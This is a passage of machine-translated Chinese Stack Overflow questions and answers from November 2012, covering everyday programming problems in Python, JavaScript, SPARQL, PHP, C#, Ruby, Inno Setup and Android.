这不起作用——而且可能没有意义，因为我一直在尝试多种方法来做到这一点。如何获取输入文件提供的字符串并将其准备为`soup.find()`函数的正确语法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T03:11:09.747

你可以这样解析`line`：

```
line = 'http://www.example.com | div, id=doctext'
url, args = line.split(' | ', 1)
args = args.split(',')
name = args[0]
params = dict([param.strip().split('=') for param in args[1:]])
print(name)
print(params) 
```

产量

```
div
{'id': 'doctext'} 
```

然后你可以这样调用`soup.find`：

```
html = urllib2.urlopen(url).read()
soup = BeautifulSoup(html)
html_section = str(soup.find(name, **params)) 
```

* * *

警告：请注意，如果`doctext`（或其他关键字参数）包含逗号，则

```
args = args.split(',') 
```

会将参数拆分到错误的位置。如果您正在搜索`text`包含逗号的某些内容，则可能会出现此问题。

* * *

**所以让我们寻找一个更好的解决方案：**

为避免上述问题，您可以考虑使用[JSON 格式](http://docs.python.org/2/library/json.html)的参数：如果`line`看起来像这样：

```
'http://www.example.com | ["div", {"id": "doctext"}]' 
```

然后你可以用

```
import json
line = 'http://www.example.com | ["div", {"id": "doctext"}]'
url, arguments = line.split('|', 1)
url = url.strip()
arguments = json.loads(arguments)
args = []
params = {}
for item in arguments:
    if isinstance(item, dict):
        params = item
    else:
        args.append(item)

print(args)
print(params) 
```

产生

```
[u'div']
{u'id': u'doctext'} 
```

然后你可以打电话`soup.find`给

```
html_section = str(soup.find(*args, **params)) 
```

另一个优点是您可以提供任意数量的[soup.find 位置参数](http://www.crummy.com/software/BeautifulSoup/bs4/doc/#find)（for `name`、`attrs`、`recursive`和`text`），而不仅仅是`name`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-24T03:44:53.050

假设用户将这些参数提供给脚本，您将使用 sys.argv 获取它们，然后将它们与您的代码一起使用

```
#foo.py
import sys

for arg in sys.argv:
    print arg

hvn@hvnatvcc: ~/test $ python foo.py http://xyz.com div doctext
foo.py
http://xyz.com
div
doctext 
```

您的代码将如下所示

```
html = urllib2.urlopen(sys.argv[1]).read()
soup = BeautifulSoup(html)
html_section = str(soup.find(sys.argv[2], id=sys.argv[3])) 
```

您的代码有什么问题： `find()`不会将`id`字符串`id="doctext"`视为功能的关键。Python 将`'id="doctext"'`其视为一个完整的字符串。

# javascript - javascript删除特定字符之前的字符串

> ID：13537830
> 
> 赞同：1
> 
> 时间：2012-11-24T02:54:22.970
> 
> 标签：javascript, string

我一直在寻找和寻找，但只能找到我的问题的变体......

我需要在字符之前删除一个字符串（包括字符，以及字符前后的空格）。该字符串每次都会不同且不可预测，因此无论它是什么都需要从 DOM 中删除。所以，如果这是输出：

```
<h2>Birds - Norwegian Yellow Finch</h2>
<h2>Cats - Domestic Shorthaired Tabby</h2>
<h2>Dogs - Alaskan Husky Cross</h2> 
```

如何删除“Birds - , Cats - , Dogs - ”？并且没有具体说明这些词（鸟、猫、狗），因为它们会改变。如果需要，破折号 (-) 可以是不同的字符（即：*）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T03:05:30.890

你可以用一个简单`RegExp`的方法来解决这个问题。

**HTML：**

```
<h2>Birds - Norwegian Yellow Finch</h2>
<h2>Cats - Domestic Shorthaired Tabby</h2>
<h2>Dogs - Alaskan Husky Cross</h2>​ 
```

**JavaScript：**

```
var re = /^[^-]+-\s*/;

function processText(el) {
    el.textContent = el.textContent.replace(re, '');
}

var elements = ​document.getElementsByTagName('h2')​​​​;

for(var i = 0, l = elements.length; i < l; i++) {
    processText(elements[i]);
}​ 
```

[**演示**](http://jsfiddle.net/f0t0n/DrLD7/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-24T03:06:22.003

以下循环遍历所有 h2 元素并通过正则表达式替换删除开头：

```
window.onload = function() {
    var h2s = document.getElementsByTagName("h2"),
        i;

    for (i=0; i < h2s.length; i++)
        h2s[i].innerHTML = h2s[i].innerHTML.replace(/^[^-]+ - /,"");​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​
}; 
```

演示：http: [//jsfiddle.net/nGfYd/5/](http://jsfiddle.net/nGfYd/5/)

处理程序确保代码在`onload`页面加载完成后运行，因为 JavaScript 在页面被解析时执行，但它只能操作已经被解析的元素。如果将代码包含在相关元素之后的脚本块中，则不需要`onload`处理程序，实际上我的偏好是将`<script>`块放在结束标记之前的正文末尾`</body>`而不使用`onload`处理程序。

编辑：从其他答案下的评论看来，您很乐意使用 jQuery，在这种情况下，您可以这样做：

```
$(document).ready(function(){
    $("h2").text(function(i, oldVal) {
        return oldVal.replace(/^[^-]+ - /,"");
    });
}); 
```

演示：http: [//jsfiddle.net/nGfYd/7/](http://jsfiddle.net/nGfYd/7/)

如果你将一个函数传递给`.text()`jQuery，它将为每个元素调用该函数，并将元素的旧（当前）值传递给它，所以你也不需要`.each()`循环。

（同样，如果您将代码放在正文末尾的脚本块中，则不需要文档就绪处理程序。）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-24T03:00:56.910

这是一个不使用正则表达式[http://jsfiddle.net/46G5c/](http://jsfiddle.net/46G5c/)的解决方案：

```
$('h2').each(function() {
    var h2 = $(this);
    var text = h2.text();
    var replacement = text.substr(text.indexOf('- ') + 2);
    h2.text(replacement);
});​ 
```

这是一个使用正则表达式的表达式，根据您的数据[http://jsfiddle.net/X3FTV/1/](http://jsfiddle.net/X3FTV/1/)可能会或可能不会更有用：

```
var regex = /^[^-]* - /;
$('h2').each(function() {
    var h2 = $(this);
    var text = h2.text();
    h2.text(text.replace(regex, ''));
});​ 
```

两者都使用 jQuery，但应该直接更改为纯 JavaScript。

# rdf - 查询 SPARQL 中没有结果

> ID：13537835
> 
> 赞同：1
> 
> 时间：2012-11-24T02:55:22.417
> 
> 标签：rdf, sparql, jena

我正在使用 JENA，并且出于学习目的进行了一些简单的查询。其中之一是：

```
PREFIX uni:<http://www.university.fake/university#>
PREFIX rdf:<http://www.w3.org/1999/02/22-rdf-syntax-ns#>
PREFIX rdfs:<http://www.w3.org/2000/01/rdf-schema#>

SELECT ?person
WHERE {
    ?person rdf:type/rdfs:subClassOf <uni:Person>.
    ?person uni:has_name ?name.
    ?person uni:member_of ?dep.
    ?dep uni:dep_city "Patras".
} 
```

`?dep`如果没有第四个三元组，如果第三个被引用的值替换，其余的确实会产生结果。但是，当添加第四个三元组时，没有结果。三元组本身确实会在自己的查询中产生结果，所以我认为那里没有任何问题。

一些 RDF 数据：

```
<rdf:Property rdf:about="uni:member_of">
    <rdfs:domain rdf:resource="uni:Person"/>
    <rdfs:range rdf:resource="uni:Department"/>
</rdf:Property>
<rdf:Property rdf:about="uni:dep_city">
    <rdfs:domain rdf:resource="uni:Department"/>
    <rdfs:range rdf:resource="uni:Literal"/>
</rdf:Property>
<rdf:Description rdf:about="uni:dep1">
    <uni:dep_name>CEID</uni:dep_name>
    <uni:dep_city>Patras</uni:dep_city>
</rdf:Description>
<rdf:Description rdf:about="uni:prof2">
    <uni:has_name>Bob Ross</uni:has_name>
    <uni:has_phone>6981234566</uni:has_phone>
    <uni:has_age>52</uni:has_age>
    <uni:member_of>CEID</uni:member_of>
    <uni:teaches>Painting</uni:teaches>
    <rdf:type rdf:resource="uni:Professor"/>
</rdf:Description> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-24T15:54:02.810

啊哈，所以考虑到数据，根据一个人的观点，要么查询错误，要么数据建模错误。

就目前而言`?person uni:member_of ?dep`是行不通的。您可以加入`uni:dep_name`（假设这些是唯一键）。

```
?person uni:member_of ?dep_name .
?dep uni:dep_name ?dep_name ;
     uni:dep_city "Patras" . 
```

但是我认为数据确实应该被纠正为 make (in turtle 语法) `uni:prof2 uni:member_of uni:dep1`。

实际上，您的数据存在更严重的问题，这对于初学者甚至使用 rdf/xml 的有经验的人来说并不少见。

```
<rdf:Description rdf:about="uni:member_of">
   ... 
```

这*并不*意味着你认为它意味着什么。`rdf:about`和`rdf:resource`属性采用完整的 URL，而不是缩写形式。您应该使用`rdf:about="http://example.com/namespace/university#member_of"`, 或任何 uni 命名空间的 URL。

这个错误就是为什么你有：

```
?person rdf:type/rdfs:subClassOf <uni:Person> 
```

而不是：

```
?person rdf:type/rdfs:subClassOf uni:Person 
```

在 SPARQL 中，turtle`<uni:Person>`匹配 URL 'uni:Person'（不存在），而 'uni:Person' 是一个缩写 URL，它将使用 uni 前缀进行扩展。

当您学习时，我强烈建议您避免使用 rdf/xml。Turtle 更容易读写，并且在很大程度上匹配 SPARQL 语法（减去变量）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-24T18:45:33.990

显然错误出现在 中`<uni:member_of>CEID</uni:member_of>`，它应该是对另一个资源的引用。正确的是`<uni:member_of rdf:resource="uni:dep1"/>`

# asp.net - 用于自定义服务器端验证器的星号

> ID：13537839
> 
> 赞同：0
> 
> 时间：2012-11-24T02:56:21.180
> 
> 标签：asp.net, vb.net

我有一个自定义服务器端验证器。它用于验证多个不同的控件，这些控件通过相互比较进行验证。例如，如果一个下拉列表的值为 x，那么另一个下拉列表必须选择某个值。

该表单是在转发器函数中动态创建的，并在代码端绑定。

如何仅使用一个自定义验证器并在不符合所需条件的相应控件旁边显示星号。

目前，我只是在摘要中显示一条错误消息，但我想向用户提供更多信息，以了解具体哪个控件不正确。

我考虑的一个选项是在每个要验证的控件旁边放置一个标签控件，最初将其可见性设置为隐藏，然后如果该控件验证失败，则将其设置为可见，值为“*”，但有没有更简单的方法？

任何帮助表示赞赏。谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T14:54:27.120

我最终为需要验证的每一行数据创建了一个自定义验证器。这是在转发器控件中动态完成的，然后星号显示在需要修改的行上。这很适合我所需要的。谢谢！

# inno-setup - 安装完成后如何使用 Inno Setup 将安装路径写入注册表

> ID：13537841
> 
> 赞同：7
> 
> 时间：2012-11-24T02:56:33.310
> 
> 标签：inno-setup

使用 Inno sSetup 安装完成后如何将安装路径写入注册表？</p>

提前致谢！

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-11-26T12:52:22.187

`ssPostInstall`就像 TLama 说的，如果你想在安装过程完成后添加密钥，你可以通过它来实现。

```
[Code]
procedure CurStepChanged(CurStep: TSetupStep);
begin
  if CurStep=ssPostInstall then begin
     RegWriteStringValue(HKEY_LOCAL_MACHINE, 'Software\HHSTECH',
    'InstallPath', ExpandConstant('{app}'));
  end;
end; 
```

或者您可以使用`AfterInstall`将在安装（复制）最后一个文件后调用的。

```
[Files]
Source: ".\THEVERYLASTFILE.XXX"; DestDir: "{app}"; AfterInstall: MyAfterInstall

[Code]
procedure MyAfterInstall();
begin
     RegWriteStringValue(HKEY_LOCAL_MACHINE, 'Software\HHSTECH',
    'InstallPath', ExpandConstant('{app}'));
end; 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-11-24T03:50:02.903

```
[Registry]
Root: HKLM; Subkey: Software\HHSTECH; ValueType: string; ValueName: InstallPath; ValueData: {app} 
```

# javascript - 通过方法传递数组

> ID：13537842
> 
> 赞同：0
> 
> 时间：2012-11-24T02:56:43.887
> 
> 标签：javascript, arrays, parameter-passing

我已经做了很多调试，但似乎错误发生在我尝试在`ae2Multi()`.

```
<html><head>
<title>Custom</title>
<style type="text/css"></style>
<script type="text/javascript">
    function ae2(elementName) {
        var elementObject;
        var elementType = elementName.charAt(0);

        if(elementType == "#") {
            elementObject = document.getElementById(elementName.substr(1));
        } else if(elementType == ".") {
            elementObject = document.getElementsByClassName(elementName.substr(1));
        } else {
            elementObject = document.getElementsByTagName(elementName);
        }
        return elementObject;
    }

    function ae2Single() {
        this.innerHTML = "singleIsWorking";
    }

    function ae2Multi() {
        alert(this);
        for (var i = 0; i < this.length; i++) {
            this[i].innerHTML = "it really worked!";
        }
    }

    Element.prototype.ae2Single = ae2Single;
    Element.prototype.ae2Multi = ae2Multi;

    window.onload = function() {
        ae2(".container").ae2Multi();
    }
</script></head><body><div id="containerMain">hello world!</div><div class="container">hello again!</div><div class="container">hello yet again!</div></body</html> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T03:06:10.987

当您选择多个元素时，您会返回一个`NodeList`，而不是`Element`. 所以你需要编辑`NodeList`原型：

```
Element.prototype.ae2Single = ae2Single;
NodeList.prototype.ae2Multi = ae2Multi; 
```

`getElementById``Element`似乎是唯一一个返回a 的，而其余的则返回 a `NodeList`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-24T05:13:41.343

即使有人威胁要砍掉你的手，也不要增加原生对象的原型，除非你这样做。

编辑：提供这个答案是因为你问“无论如何要写 1 个函数来做这两个”

```
function ae2(elementName) {
    var elementObject;
    var elementType = elementName.charAt(0);

    if(elementType == "#") {
        elementObject = document.getElementById(elementName.substr(1));
    } else if(elementType == ".") {
        elementObject = document.getElementsByClassName(elementName.substr(1));
    } else {
        elementObject = document.getElementsByTagName(elementName);
    }

    if(elementObject.length === 1){
        //ae2Single
        elementObject.innerHTML = "singleIsWorking";
    }
    else if(elementObject.length > 1){
        //ae2Multi
        for (var i = 0; i < elementObject.length; i++) {
            elementObject[i].innerHTML = "it really worked!";
        }
    }

} 
```

# javascript - 在鼠标悬停时显示动态创建的 div 并删除

> ID：13537844
> 
> 赞同：4
> 
> 时间：2012-11-24T02:56:51.883
> 
> 标签：javascript, jquery

我搜索了很多问题，但我没有找到正确的方法。我的问题是：我想创建一个`div`动态的，在`mouseover`将它附加到另一个时显示它`div`，并删除（通过`remove()`函数）在`mouseout`. 我尝试了几种方法，但在任何一种方法中，有时会`div`出现然后消失，有时不会，有时当我的鼠标离开容器中的文本时它会消失`div`。感谢你们 。

### 这是我的代码

```
 var usr = 'username_pre';

var newdiv = $('<div>', { 
              html: '<a href="#" title="">'+usr+'</a> </br> <a href="#" title="">impostazioni</a> </br> <a href="#" title="">esci</a>'
              });

$("#container").mouseover(function(){
        $("#options").css('visibility','visible').append(newdiv);
    }); 
$("#options").mouseout(function(){
         $(newdiv).remove();
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T03:12:07.783

这有帮助吗：

```
$("#container").mouseover(function(){
        $("#options").css('display','block').append(newdiv);
    }); 
$("#options").mouseout(function(){
    $("#options").css('display','none');
    $(newdiv).remove();
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-24T19:00:24.057

我使用以下方法解决了我的问题：

这段代码html：

```
 <div id="container" class="cont">
  <a href="#" id="username" class="nomeutente" title=""> Stefano Imparato </a>
  </div>
  <div id="options" >
  <a href="#" id="user" title="">usr</a> </br>
  <a href="#" title="">impostazioni</a> </br>
  <a href="#" title="">esci</a> 
  </div> 
```

代码jQuery：

```
$("#container").mouseover(function(){   
        $("#container").append($("#options"));
        $("#options").css({
            'display' : 'block'
        });
        $(this).find('#user').text(usr);
    });

$("#container").mouseout(function(){
    $("#options").css('display','none');
}); 
```

CSS：

```
#option { display: none; } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-24T14:44:09.350

这是 html ：

```
<div id="container" class="cont">
<a href="#" id="username" class="nomeutente" title=""> Stefano Imparato </a>
<div id="options" class="opt"></div>
</div> 
```

# php - MYSQL中单个字段的PHP

> ID：13537849
> 
> 赞同：0
> 
> 时间：2012-11-24T02:58:24.337
> 
> 标签：php, mysql, mysqli

我正在使用 PHP 访问 MYSQL 数据库，我需要从表中提取数据。问题是只有一个字段可以获取。

```
 $mysqli = new mysqli($hostname, $username, $password, $db_name);

        // Output error info if there was a connection problem
        if ($mysqli->connect_errno)
            die("Failed to connect to MySQL: ($mysqli->connect_errno) $mysqli->connect_error");

        $db = "SELECT username1 FROM Friends WHERE username2 = '"."$username"."' UNION SELECT username2 FROM Friends WHERE username1 = '"."$username"."'";

        $result = $mysqli->query($db) or
            die ("Wasn't able to search the database");

        while($result->fetch_field($row))
        {
            echo "<h1> $row </h1>";
        } 
```

我保证我已连接到我的数据库。我还在括号中使用了 $result->fetch_field() 而不是 $row。我的主要问题是 fetch_field 返回一个对象，但在所有 PHP 手册中，他们没有说明如何提取该字段的实际值。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T03:23:55.123

您确定`$username`查询中的变量是您期望的吗？您`SELECT`可能正在返回`0`行。

您在代码中使用`$username`了两次。
首先在你的`mysqli`-

```
$mysqli = new mysqli($hostname, $username, $password, $db_name);
                                --------- 
```

再次在你的`SELECT`-

```
$db = "SELECT username1 FROM Friends WHERE username2 = '"."$username"."' UNION SELECT username2 FROM Friends WHERE username1 = '"."$username"."'";
                                                           ---------                                                               --------- 
```

尝试添加

```
if ($result->num_rows > 0){
  while ($row = $result->fetch_row()) {
  echo "<h1>".$row[0]."</h1>";}
}
else {echo "No Query / Returned 0 Rows";} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-24T03:06:32.113

```
while ($obj = $result->fetch_object()) {
    echo "<h1>".$obj->username1."</h1>";
} 
```

*mysqli_fetch_object() 将当前行结果集作为对象返回，其中对象的属性表示在结果集中找到的字段的名称。*

没有 fetch_value($table, $column, $where) 函数有点生气

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-24T03:17:19.290

尝试从结果中获取一个数组，如下所示：

```
while($row = fetch_assoc($result))
    {
        echo "<h1> $row['username1'].''.$row['username2'] </h1>";
    } 
```

我假设所有记录都有 username1 和 username2 NOT NULL 并并排显示它们（例如名字和姓氏）。

# c# - Shell32.dll 参考导致问题

> ID：13537850
> 
> 赞同：3
> 
> 时间：2012-11-24T02:58:34.333
> 
> 标签：c#, unzip, windows-shell, codedom

我正在使用 3.5 的 .NET Framework 使用 C# 制作应用程序，该应用程序具有解压缩文件的功能；但是，当我运行它时，一旦它进入解压缩方法，它就会因 Windows“停止工作”错误而崩溃。它不会读取方法中的任何行，只是在输入时崩溃。

```
Description:
Stopped working

Problem signature:
Problem Event Name: CLR20r3
Problem Signature 01:   test.exe
Problem Signature 02:   0.0.0.0
Problem Signature 03:   50b03509
Problem Signature 04:   Test
Problem Signature 05:   0.0.0.0
Problem Signature 06:   50b03509
Problem Signature 07:   1
Problem Signature 08:   38
Problem Signature 09:   System.IO.FileNotFoundException
OS Version: 6.1.7601.2.1.0.256.48
Locale ID:  1033 
```

使用“已停止工作菜单”中的调试功能后，出现此错误。

```
Could not load file or assembly 'Interop.Shell32, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null' or one of its dependencies. The system cannot find the file specified. 
```

我使用此代码在 CodeDom 编译器中导入 Shell32.dll。

```
Params.ReferencedAssemblies.Add("Interop.Shell32.dll"); 
```

这是在崩溃的方法中解压缩文件的代码。

```
Shell32.ShellClass sc = new Shell32.ShellClass();
                Shell32.Folder SrcFlder = sc.NameSpace(source);
                Shell32.Folder DestFlder = sc.NameSpace(dest);
                Shell32.FolderItems items = SrcFlder.Items();
                DestFlder.CopyHere(items, 20); 
```

我不确定为什么会这样。它在原始应用程序中完美运行，但是当我使用 CodeDom 编译它（不产生错误）并运行它时，就会发生这种情况。我没有正确引用 COM 吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T03:19:17.183

> 无法加载文件或程序集“Interop.Shell32，Version=1.0.0.0，Culture=neutral，PublicKeyToken=null”或其依赖项之一。该系统找不到指定的文件。

引用已加载到您的程序集中。但是您的应用程序找不到您的 COM 依赖项。

您需要在主可执行文件的根目录上拥有“Interop.Shell32.dll”。

为此，在 Visual Studio 上，单击引用时我们有一个选项，即“复制本地” - 仅将其设置为 true，并且依赖项将在下一次构建时复制到应用程序文件夹。

然后，您可以使用构建文件夹中的库文件运行您的应用程序。

# python - python在新窗口中发送结果

> ID：13537853
> 
> 赞同：0
> 
> 时间：2012-11-24T02:59:53.377
> 
> 标签：python, user-interface, tkinter

我想将一些结果从我的程序发送到另一个窗口，而不是发送到控制台（在 Windows 中的命令提示符处）。也就是说，当我以前只用 Python 制作过非 GUI 命令行“hello world”程序时，我想学习制作 GUI 应用程序。我从哪说起呢：

这是一个命令行程序：

```
 print 'I love python '   # output to standard console output 
```

我如何将“我爱蟒蛇”的消息放在它自己的新窗口中？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T03:31:28.000

一种方法是学习[tkinter](http://www.pythonware.com/library/tkinter/introduction/)。使用您自己创建的窗口制作“GUI”应用程序需要做很多工作。

您必须创建一个窗口，然后将内容放入这些窗口中，然后对用户单击内容做出反应，而不是打印一行代码。

**更新**直到我编辑了你的问题（在你接受了这个答案之后）我不确定，所以我猜你是在问“我如何让我的输出进入一个新窗口，而不是我现在打印语句所在的控制台”。那个不清楚的问题现在已经被我自己改写了你的问题。（想要查看原始不可读问题的人应该查看编辑历史记录）。

# ruby - 如何将整数和字符串数组转换为字符串，但在字符串周围保留单引号？

> ID：13537855
> 
> 赞同：1
> 
> 时间：2012-11-24T03:00:07.153
> 
> 标签：ruby

我需要将字符串和整数数组转换为联合字符串，同时保留字符串值周围的单引号。例如，我需要转这个：

```
["abc", "xyz", 123, 456] 
```

进入这个：

```
"'abc','xyz',123,456" 
```

我尝试了 and 的变体`join`，`to_s`但这并不完全奏效。任何帮助表示赞赏。

我得到它与单线工作：

```
["abc", "xyz", 123, 456].to_s.gsub(/[\[\]\"]/,'[' =>'','"'=>'\'')
#=> "'abc', 'xyz', 123, 456" 
```

但我仍然很好奇是否有更好的方法。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T03:25:13.860

以下应该工作

```
array = ["abc", "xyz", 123, 456]
array.collect{|e| e.to_i == e ? e : "'#{e}'"}.join(",") 
```

返回

```
"'abc','xyz',123,456" 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-24T04:20:37.393

使用`inspect`，不使用`to_s`。

通常，在字符串文字表达式中，使用双引号而不是单引号。如果您不介意使用双引号而不是单引号，那么这很简单：

```
["abc", "xyz", 123, 456].map(&:inspect).join(",")
# => "\"abc\",\"xyz\",123,456" 
```

但是如果你真的想要单引号，那么只要你在原始字符串中没有双引号，那仍然不是那么困难：

```
["abc", "xyz", 123, 456].map(&:inspect).join(",").tr('"', "'")
# => "'abc','xyz',123,456" 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-24T04:21:35.713

当数组有带数字的字符串时 to_i 转换为整数。如果您想将其保留为字符串。我认为你需要使用这个。

```
 arr=["123", "abc", 123]
      arr.collect{|e|( e.is_a? Integer)? e :"'#{e}'"}.join(',') #=> "'abc','123',1,3" 
```

# iphone - 最初的系绳 iPhone 应用程序如何通过 USB 共享手机的互联网连接？

> ID：13537859
> 
> 赞同：1
> 
> 时间：2012-11-24T03:01:03.693
> 
> 标签：iphone, ios, usb, tethering

通过 SOCKS 连接到 iPhone 很笨重，而且容易出错。曾经有一个由 tether.com 发布的应用程序，允许用户通过 USB 与他们的 mac 共享他们的 3g/4g/LTE 互联网连接。我认为这将是一个值得的开源项目。试图弄清楚这是否可能。

# facebook - 如何获取用户的@facebook 电子邮件地址

> ID：13537868
> 
> 赞同：-1
> 
> 时间：2012-11-24T03:03:00.290
> 
> 标签：facebook, email

我正在开发一个 Facebook 应用程序并实现了登录对话框。我想获取用户的@facebook 电子邮件地址（例如 johnsmith@facebook.com）。有没有办法获取这些信息？谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T02:17:10.263

无需进行大量研究（我将把它作为练习留给读者）我相信用户 Facebook 的电子邮件地址只是放在@facebook.com 前面的用户用户名。例如“用户名”@facebook.com。

用户名可在图表中访问。

知道了这一点，您就可以很好地猜测用户的电子邮件地址是什么。

也就是说，这显然不是官方认可的方法，即使它确实有效，也可能违反 Facebook TOS，所以买家要小心！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-24T03:54:28.660

Legacy Rest API *（在弃用过程中，所以不推荐）*有 users.getInfo

Graph API 具有 User 对象，您可以在其中获取用户的字段/信息*（通过字段查询，例如：graph.facebook.com/me?fields=id,name,email 或者您可以在[Grap API explorer](https://developers.facebook.com/tools/explorer/)中尝试）*

将显示的数据取决于用户帐户隐私或应用授予的权限（您还需要访问令牌）。如果您没有该信息的权限，则查询将返回所请求字段的空/无数据。

[https://developers.facebook.com/docs/reference/api/user/](https://developers.facebook.com/docs/reference/api/user/)

我也是开发 facebook 应用程序的新手。也许他们 50% 错了：D

# php - 如何使 url 指向没有扩展名的图像文件

> ID：13537872
> 
> 赞同：1
> 
> 时间：2012-11-24T03:03:58.843
> 
> 标签：php, .htaccess, rewrite

我在我的网站上按类别在特定文件夹中收集了一组图像。每个图像都有一个`ID`这也是它的名称。图像可以是`PNG`s 或`JPG`s。

如果`PNG`图像有一个URL 怎么可能是`ID`服务器指向而不是，反之亦然？`abc123``example.com/category/abc123/``/images/category/abc123.png``/images/folder/abc123.jpg`

我想用 .htaccess RewriteCond & RewriteRule 尝试一些东西，但我不确定我会怎么做。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T03:47:25.000

一个非常简单且无痛的解决方案是使用`Options +MultiViews`. 它的作用很简单：如果服务器收到对它无法找到的文件的请求，它会在同一方向搜索具有相同名称的任何文件 + 任何文件扩展名（例如，`foo`匹配`foo.jpg`or `foo.png`，但不匹配`foobar.jpg`）并读取那个文件。如果找到多个匹配项，则服务器“选择最符合客户端要求的匹配项，并返回该文档”。

[在这里阅读更多](http://httpd.apache.org/docs/2.2/mod/mod_negotiation.html#multiviews)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-24T04:14:00.907

```
RewriteEngine On
^category/.*/ /images/category/$1.png 
```

尝试一下。

# python - 属性错误？程序即将运行

> ID：13537878
> 
> 赞同：0
> 
> 时间：2012-11-24T03:05:39.740
> 
> 标签：python, hidden-markov-models

你好：只是一个简单的问题.. 我希望。我正在尝试使用该程序从语料库中生成随机文本..在这种情况下是一本书的一部分。

我有一个文本文件是我的语料库：（这是介绍，不会在这里发布整个内容）

```
The Project Gutenberg EBook of My Man Jeeves, by P. G. Wodehouse
#27 in our series by P. G. Wodehouse

Copyright laws are changing all over the world. Be sure to check the
copyright laws for your country before downloading or redistributing
this or any other Project Gutenberg eBook.

This header should be the first thing seen when viewing this Project
Gutenberg file.  Please do not remove it.  Do not change or edit the
header without written permission.

Please read the "legal small print," and other information about the
eBook and Project Gutenberg at the bottom of this file.  Included is
important information about your specific rights and restrictions in
how the file may be used.  You can also find out about how to make a
donation to Project Gutenberg, and how to get involved.

etc etc etc 
```

接下来我有我正在尝试使用的课程：

```
import random

class Markov(object):

    def __init__(self, open_file):
        self.cache = {}
        self.open_file = open_file
        self.words = self.file_to_words()
        self.word_size = len(self.words)
        self.database()

def file_to_words(self):
    self.open_file.seek(0)
    data = self.open_file.read()
    words = data.split()
    return words

def triples(self):
    """ Generates triples from the given data string. So if our string were
            "What a lovely day", we'd generate (What, a, lovely) and then
            (a, lovely, day).
    """

    if len(self.words) < 3:
        return

    for i in range(len(self.words) - 2):
        yield (self.words[i], self.words[i+1], self.words[i+2])

def database(self):
    for w1, w2, w3 in self.triples():
        key = (w1, w2)
        if key in self.cache:
            self.cache[key].append(w3)
        else:
            self.cache[key] = [w3]

def generate_markov_text(self, size=25):
    seed = random.randint(0, self.word_size-3)
    seed_word, next_word = self.words[seed], self.words[seed+1]
    w1, w2 = seed_word, next_word
    gen_words = []
    for i in xrange(size):
        gen_words.append(w1)
        w1, w2 = w2, random.choice(self.cache[(w1, w2)])
    gen_words.append(w2)
    return ' '.join(gen_words) 
```

最后给出错误的主要内容：“'Markov'对象没有属性'file_to_words'”

```
import Class
file_ = open('derp.txt')
markov = Class.Markov(file_)
markov.generate_markov_text() 
```

这里出了什么问题？谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T03:09:01.383

您需要缩进该`file_to_words`方法，使其成为 Markov 类的一部分。您目前拥有它的方式是函数中的模块级`Class`函数。将`file_to_words`方法中的所有内容（包括`def`行）向右移动 4 个空格。

**更新**：所有其他方法也是如此。Python 使用空格/缩进来表示范围。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-24T03:09:28.607

从您发布的代码中，除了 init 之外的所有方法都不属于 Markov 类，因为缩进。

# android - 如何在android中使用gridview的水平滚动条？

> ID：13537886
> 
> 赞同：5
> 
> 时间：2012-11-24T03:06:49.357
> 
> 标签：android, gridview, scrollbar

```
<GridView
android:id="@+id/gridView1"
android:layout_width="wrap_content"
android:layout_height="match_parent"
android:columnWidth="100dip"
android:numColumns="8"
android:scrollbarStyle="insideOverlay"
android:scrollbars="vertical|horizontal"
android:stretchMode="none" >
</GridView> 
```

如上所示，我想在 gridview 中同时使用垂直和水平滚动条。我看到垂直的效果很好，但水平的不行。所以我尝试通过将 gridview 放置在 Horizo​​ntal Scroll View 下来修复它，如下所示

```
 <HorizontalScrollView
        android:id="@+id/horizontalScrollView1"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content" >

        <GridView
            android:id="@+id/gridView1"
            android:layout_width="wrap_content"
            android:layout_height="match_parent"
            android:columnWidth="100dip"
            android:numColumns="8"
            android:scrollbarStyle="insideOverlay"
            android:scrollbars="vertical|horizontal"
            android:stretchMode="none" >
        </GridView>

    </HorizontalScrollView> 
```

更糟糕的是，它只显示一列gridview，当然，没有水平滚动条。

我该如何解决？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-23T10:15:58.693

`GridView`扩展`AbsListView`类。本质上，网格视图是一个列表视图，除了行之外还支持列。所以它不支持水平滚动。

您通过设置`android:scrollbars="vertical|horizontal"`属性所做的基本上是指示网格视图同时显示水平滚动条和垂直滚动条。设置此属性不会启用视图中的滚动（gridview 和 listviews 在本质上启用了滚动）。

如果您可以对您正在尝试做的事情进行更多解释，则可以建议另一种方法。

* * *

## 回答 #2

